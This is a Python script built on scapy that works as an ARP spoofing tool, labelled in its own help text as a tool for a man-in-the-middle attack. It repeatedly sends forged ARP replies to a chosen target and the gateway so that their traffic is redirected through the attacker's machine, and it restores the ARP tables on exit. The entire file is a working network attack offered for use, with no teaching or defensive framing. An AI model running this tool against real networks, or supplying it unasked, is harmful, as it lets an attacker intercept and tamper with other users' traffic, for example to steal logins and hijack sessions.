#!/usr/bin/env python3
import argparse
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp
from scapy.all import conf, sendp
import time
import sys, os

def root_check():
    if os.geteuid() != 0:
        sys.exit("[!] This script must run as root")
    else:
        print("[*] Welcome to the ARP Spoofer.")

packet_count = 0

def parse_args():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool for Man in the Middle Attack")
    parser.add_argument('-t', '--target', required=True, help="Target's IP address")
    parser.add_argument('-g', '--gateway', default=conf.route.route("0.0.0.0")[2],
                        help="Gateway IP address (default: system default gateway)")
    return parser.parse_args()

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, retry=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] No response received for {ip}. Check network connectivity and permissions!")
        return None

def spoof_arp(target_ip, spoof_ip):
    global packet_count

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] Could not get MAC address for {target_ip}.")
        return False

    ethernet_frame = Ether(dst=target_mac)
    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = ethernet_frame / arp_packet
    sendp(packet, verbose=False)

    packet_count += 1

    print(f"\r[*] Sending spoofed ARP packet to {victim_ip} and {gateway_ip}. Total packets sent: {packet_count}", end="", flush=True)
    return True

def restore_arp(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac is None or source_mac is None:
        print(f"[!] Could not resolve MAC addresses for restore operation between {destination_ip} and {source_ip}")
        return False

    ethernet_frame = Ether(dst=destination_mac)
    arp_packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    packet = ethernet_frame / arp_packet
    sendp(packet, count=4, verbose=False)
    print(f"[*] Sent restore ARP packets to {destination_ip} to fix ARP table")
    return True

if __name__ == "__main__":
    root_check()
    args = parse_args()

    victim_ip = args.target
    gateway_ip = args.gateway

    try:
        while True:
            success1 = spoof_arp(target_ip=gateway_ip, spoof_ip=victim_ip)
            success2 = spoof_arp(target_ip=victim_ip, spoof_ip=gateway_ip)

            if not (success1 and success2):
                print("[!] Some spoof packets failed to send due to MAC resolution failures.")

            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[+] Detected User Interruption ... Resetting ARP table ... Please wait.")
        success3 = restore_arp(victim_ip, gateway_ip)
        success4 = restore_arp(gateway_ip, victim_ip)

        if not (success3 and success4):
            print("[!] Some restore packets failed to send due to MAC resolution failures.")

        time.sleep(2)
        print("[*] ARP table restored. Exiting.")
